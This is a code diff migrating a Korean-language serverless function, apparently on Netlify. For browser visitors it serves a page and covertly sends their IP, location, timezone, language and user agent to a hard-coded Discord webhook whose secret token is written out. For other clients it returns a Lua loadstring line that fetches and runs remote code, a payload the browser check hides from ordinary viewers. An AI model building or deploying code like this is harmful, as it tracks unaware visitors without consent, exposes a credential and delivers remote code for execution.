@@ -1,29 +1,19 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573933952517799967/GfU0TKPmFzbxfy7WHSMhYPJmF1ka3yMKpdQU4T2nosQJWYrDRn257nwkmPYfwS8YM5WD';
 
 function isBrowserRequest(headers) {
-  const h = {};
-  for (const [k, v] of Object.entries(headers || {})) {
-    h[k.toLowerCase()] = v;
-  }
-  const hasSecFetchMode = Boolean(h['sec-fetch-mode']);
-  const hasSecFetchDest = Boolean(h['sec-fetch-dest']);
-  const hasUpgradeInsecure = Boolean(h['upgrade-insecure-requests']);
-  const accept = String(h['accept'] || '').toLowerCase();
+  const hasSecFetchMode = Boolean(headers.get('sec-fetch-mode'));
+  const hasSecFetchDest = Boolean(headers.get('sec-fetch-dest'));
+  const hasUpgradeInsecure = Boolean(headers.get('upgrade-insecure-requests'));
+  const accept = (headers.get('accept') || '').toLowerCase();
   const acceptsHtml = accept.includes('text/html');
 
   return hasSecFetchMode || hasSecFetchDest || hasUpgradeInsecure || acceptsHtml;
 }
 
-function getClientIp(headers) {
-  const h = {};
-  for (const [k, v] of Object.entries(headers || {})) {
-    h[k.toLowerCase()] = v;
-  }
-  const xff = h['x-forwarded-for'];
-  if (xff) {
-    return xff.split(',')[0].trim();
-  }
-  return h['x-nf-client-connection-ip'] || h['client-ip'] || 'unknown';
+function getClientIp(headers, info) {
+  const xff = headers.get('x-forwarded-for');
+  if (xff) return xff.split(',')[0].trim();
+  return info?.ip || headers.get('x-nf-client-connection-ip') || headers.get('client-ip') || 'unknown';
 }
 
 async function getIpDetails(ip) {
@@ -62,15 +52,10 @@ async function getIpDetails(ip) {
   return fallback;
 }
 
-async function sendDiscordWebhook(headers) {
+async function sendDiscordWebhook(headers, contextInfo) {
   if (!WEBHOOK_URL) return;
 
-  const h = {};
-  for (const [k, v] of Object.entries(headers || {})) {
-    h[k.toLowerCase()] = v;
-  }
-
-  const rawIp = getClientIp(headers);
+  const rawIp = getClientIp(headers, contextInfo);
   const info = await getIpDetails(rawIp);
 
   const now = new Date();
@@ -93,8 +78,8 @@ async function sendDiscordWebhook(headers) {
     `시각(KST): ${kstTime}`,
     `위치: ${info.country} / ${info.region} / ${info.city}`,
     `시간대: ${info.timezone}`,
-    `언어: ${h['accept-language'] || 'unknown'}`,
-    `UA: ${h['user-agent'] || 'unknown'}`
+    `언어: ${headers.get('accept-language') || 'unknown'}`,
+    `UA: ${headers.get('user-agent') || 'unknown'}`
   ].join('\n');
 
   try {
@@ -108,11 +93,11 @@ async function sendDiscordWebhook(headers) {
   } catch (_) {}
 }
 
-export const handler = async (event) => {
-  const headers = event.headers || {};
+export default async (request, context) => {
+  const headers = request.headers;
 
   if (isBrowserRequest(headers)) {
-    await sendDiscordWebhook(headers);
+    await sendDiscordWebhook(headers, context?.ip);
 
     const html = `<!DOCTYPE html>
 <html lang="ko">
@@ -145,16 +130,14 @@ export const handler = async (event) => {
 </body>
 </html>`;
 
-    return {
-      statusCode: 200,
-      headers: { 'Content-Type': 'text/html; charset=utf-8' },
-      body: html
-    };
+    return new Response(html, {
+      status: 200,
+      headers: { 'Content-Type': 'text/html; charset=utf-8' }
+    });
   }
 
-  return {
-    statusCode: 200,
-    headers: { 'Content-Type': 'text/plain; charset=utf-8' },
-    body: 'loadstring(game:HttpGet("https://sojik-byouel-api.netlify.app/"))()'
-  };
+  return new Response('loadstring(game:HttpGet("https://sojik-byouel-api.netlify.app/"))()', {
+    status: 200,
+    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
+  });
 };
